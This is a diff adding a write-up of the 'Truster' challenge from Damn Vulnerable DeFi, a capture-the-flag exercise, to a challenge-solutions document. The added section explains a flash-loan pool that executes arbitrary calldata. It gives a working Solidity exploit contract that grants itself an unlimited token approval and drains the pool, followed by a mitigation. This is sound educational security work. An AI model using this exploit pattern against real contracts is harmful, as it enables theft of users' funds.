@@ -72,7 +72,7 @@ We need to make sure that we use only asset tokens that we receive from the user
     }
 ```
 
-Challenge #2 - Naive receiver
+## Challenge #2 - Naive receiver
 
 There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.
 
@@ -137,4 +137,76 @@ Allow only borrower contract to call `flashLoan` function
     ) external returns (bool) {
     if (msg.sender != address(receiver) revert NotABorrower();
     ...
+```
+
+## Challenge #3 - Truster
+More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
+
+The pool holds 1 million DVT tokens. You have nothing.
+
+To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.
+
+### `TrusterLenderPool.sol`: `flashLoan` function allows executing any malicious code via target.functionCall()
+
+Hackers can execute any code with pool addres as a `msg.sender`, we can call `flashLoan` function with DVT token address as a `target` and encoded `approve` function payload as a `data`, thus we can approve all DVT in pool's posession to be spended by anyone.
+
+### Proof of concept
+
+Attaker's contract
+
+```
+// SPDX-License-Identifier: MIT
+
+import "../truster/TrusterLenderPool.sol";
+
+pragma solidity ^0.8.0;
+
+contract TrusterExploit {
+    TrusterLenderPool public immutable pool;
+    ERC20 public immutable token;
+    bytes private evilData = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max); 
+
+    constructor (TrusterLenderPool _pool, ERC20 _token) {
+        pool = _pool;
+        token = _token;
+    }
+
+    function attack() public {
+        uint256 bal = token.balanceOf(address(pool));
+        pool.flashLoan(0, address(this), address(token), evilData);
+        token.transferFrom(address(pool), msg.sender, bal); 
+    }
+}
+```
+
+Paste the following inside a `truster.challenge.js`
+
+```
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const Exploit = await ethers.getContractFactory('TrusterExploit');
+        exploit = await Exploit.deploy(pool.address, token.address);
+
+        await exploit.connect(player).attack();
+    });
+```
+
+This will trnasfer all DVT from pool to the player address
+
+### Mitigation
+
+Allow only trusted payload to be sent by the pool contract, remove `data` parameter from the `flashLoan` function 
+
+```
+ function flashLoan(uint256 amount, address borrower, address target)
+        external
+        nonReentrant
+        returns (bool)
+    {
+        uint256 balanceBefore = token.balanceOf(address(this));
+        bytes memory trustedPayload = abi.encodeWithSignature("onFlashLoan(address, address, uint256)", borrower, address(token), amount);
+
+        token.transfer(borrower, amount);
+        target.functionCall(trustedPayload);
+        ...
 ```
